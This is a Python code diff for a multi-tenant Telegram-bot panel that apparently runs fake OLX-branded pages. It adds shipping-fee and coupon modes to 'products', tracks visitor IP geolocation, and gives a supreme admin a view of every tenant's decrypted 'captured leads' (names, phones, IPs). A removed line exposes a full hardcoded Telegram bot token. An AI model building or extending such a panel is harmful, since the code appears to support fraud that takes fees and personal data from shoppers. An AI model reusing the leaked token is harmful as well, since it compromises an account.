@@ -9,7 +9,7 @@ import requests
 
 logger = logging.getLogger("OLPG_TG_WH")
 
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8857867740:AAGZgDPq1PtQaTmvpXAvlrgVqLCfQEvy1WA").strip()
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()  # SEGURO: sem fallback hardcoded
 TELEGRAM_API   = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
 BASE_URL        = (os.environ.get("BASE_URL") or os.environ.get("APP_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "https://olx-9ee8.onrender.com").rstrip('/')
 
@@ -166,7 +166,22 @@ def init_tenant_tables():
         CREATE INDEX IF NOT EXISTS idx_tgs_id   ON tg_sessions(tg_id, entered_at);
         CREATE INDEX IF NOT EXISTS idx_tg_slug  ON tg_users(slug);
     """)
+    # ── Migração segura: adiciona colunas de modo taxa se ainda não existirem ──
+    _safe_add_column(conn, "tenant_products", "shipping_mode",   "TEXT NOT NULL DEFAULT 'full'")
+    _safe_add_column(conn, "tenant_products", "shipping_fee",    "TEXT NOT NULL DEFAULT '19.90'")
+    _safe_add_column(conn, "tenant_products", "shipping_coupon", "TEXT NOT NULL DEFAULT ''")
+    _safe_add_column(conn, "tg_sessions",     "lat",  "TEXT")
+    _safe_add_column(conn, "tg_sessions",     "lng",  "TEXT")
+    _safe_add_column(conn, "tg_sessions",     "city_geo",   "TEXT")
+    _safe_add_column(conn, "tg_sessions",     "country_geo","TEXT")
     conn.commit(); conn.close()
+
+def _safe_add_column(conn, table: str, col: str, coltype: str):
+    """Adiciona coluna na tabela sem falhar se já existir."""
+    try:
+        conn.execute(f"ALTER TABLE {table} ADD COLUMN {col} {coltype}")
+    except Exception:
+        pass  # coluna já existe
 
 # ─── PLANOS POR ADMIN ─────────────────────────────────────────────────────────
 PLAN_DEFINITIONS = {
@@ -316,6 +331,114 @@ def delete_tenant_product(tg_id: int, product_code: str):
     conn = _get_db()
     conn.execute("DELETE FROM tenant_products WHERE tg_id=? AND product_code=?", (tg_id, product_code))
     conn.commit(); conn.close()
+
+def update_tenant_product(tg_id: int, product_code: str, fields: dict) -> bool:
+    """Atualiza campos de um produto (incluindo shipping_mode, shipping_fee, shipping_coupon)."""
+    ALLOWED = {"title", "price", "old_price", "description", "image_url",
+               "image1", "image2", "image3", "shipping_mode", "shipping_fee", "shipping_coupon"}
+    updates = {k: v for k, v in fields.items() if k in ALLOWED}
+    if not updates:
+        return False
+    cols = ", ".join(f"{k}=?" for k in updates)
+    vals = list(updates.values()) + [tg_id, product_code]
+    conn = _get_db()
+    conn.execute(f"UPDATE tenant_products SET {cols} WHERE tg_id=? AND product_code=?", vals)
+    conn.commit(); conn.close()
+    return True
+
+# ─── GEOLOCALIZACÃO REAL POR IP ───────────────────────────────────────────────────
+_GEO_CACHE = {}  # {ip: {lat, lng, city, country, region, isp, ts}}
+
+def get_ip_geolocation(ip: str) -> dict:
+    """
+    Geolocalização real por IP usando ip-api.com (gratuito, 45 req/min).
+    Retorna lat, lng, cidade, estado, país, ISP.
+    Cache de 6h por IP para não estourar o limite.
+    """
+    if not ip or ip in ('127.0.0.1', '::1', 'localhost'):
+        return {"lat": None, "lng": None, "city": "Local", "region": "-", "country": "BR", "isp": "-"}
+    cached = _GEO_CACHE.get(ip)
+    if cached and time.time() - cached.get("ts", 0) < 21600:  # 6h cache
+        return cached
+    try:
+        r = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,regionName,country,countryCode,isp,org",
+            timeout=3
+        )
+        d = r.json()
+        if d.get("status") == "success":
+            geo = {
+                "lat":     round(d.get("lat", 0), 5),
+                "lng":     round(d.get("lon", 0), 5),
+                "city":    d.get("city", ""),
+                "region":  d.get("regionName", ""),
+                "country": d.get("country", ""),
+                "country_code": d.get("countryCode", "BR"),
+                "isp":     d.get("isp") or d.get("org", ""),
+                "ts":      time.time()
+            }
+            _GEO_CACHE[ip] = geo
+            return geo
+    except Exception as e:
+        logger.warning(f"[GEO] {ip}: {e}")
+    return {"lat": None, "lng": None, "city": "?", "region": "?", "country": "?", "isp": "?"}
+
+def enrich_session_with_geo(tg_id: int, session_id: str, ip: str):
+    """Salva lat/lng/city/country na sessão após geolocalizar."""
+    geo = get_ip_geolocation(ip)
+    if geo.get("lat") is None:
+        return
+    conn = _get_db()
+    conn.execute(
+        "UPDATE tg_sessions SET lat=?, lng=?, city_geo=?, country_geo=? WHERE tg_id=? AND session_id=?",
+        (str(geo["lat"]), str(geo["lng"]), geo["city"], geo["country"], tg_id, session_id)
+    )
+    conn.commit(); conn.close()
+
+def get_full_overview_for_supreme() -> dict:
+    """Visão completa de todos os admins para o Admin Supremo."""
+    conn = _get_db()
+    users = conn.execute(
+        "SELECT tg_id, username, slug, created_at FROM tg_users ORDER BY created_at DESC"
+    ).fetchall()
+    result = []
+    for u in users:
+        tid = u["tg_id"]
+        plan = get_user_plan(tid)
+        prof = get_tenant_profile(tid)
+        ok_c, curr_c, max_c = check_click_limit(tid)
+        stats_24h = get_tg_stats(tid, 24)
+        stats_7d  = get_tg_stats(tid, 168)
+        products  = conn.execute(
+            "SELECT product_code, title, price, shipping_mode, shipping_fee FROM tenant_products WHERE tg_id=? ORDER BY id DESC",
+            (tid,)
+        ).fetchall()
+        recent_leads = conn.execute(
+            "SELECT data_enc, ip, created_at FROM tg_events WHERE tg_id=? AND event_type='LEAD_CAPTURED' ORDER BY created_at DESC LIMIT 5",
+            (tid,)
+        ).fetchall()
+        leads_clean = []
+        for lev in recent_leads:
+            try:
+                ld = json.loads(_dec(lev["data_enc"]))
+            except Exception:
+                ld = {}
+            leads_clean.append({"ip": lev["ip"], "at": lev["created_at"], "name": ld.get("name","?"), "phone": ld.get("phone","")})
+        result.append({
+            "tg_id":    tid,
+            "username": u["username"],
+            "slug":     u["slug"],
+            "created_at": u["created_at"],
+            "profile":  {"display_name": prof.get("display_name",""), "bio": prof.get("bio",""), "contact": prof.get("contact","")},
+            "plan":     plan,
+            "usage":    {"current": curr_c, "max": max_c, "allowed": ok_c},
+            "stats":    {"h24": stats_24h, "h7d": stats_7d},
+            "products": [{"code": p["product_code"], "title": p["title"], "price": p["price"],
+                          "shipping_mode": p["shipping_mode"], "shipping_fee": p["shipping_fee"]} for p in products],
+            "recent_leads": leads_clean,
+        })
+    conn.close()
+    return {"admins": result, "total": len(result)}
 
 def get_tenant_profile(tg_id):
     conn = _get_db()
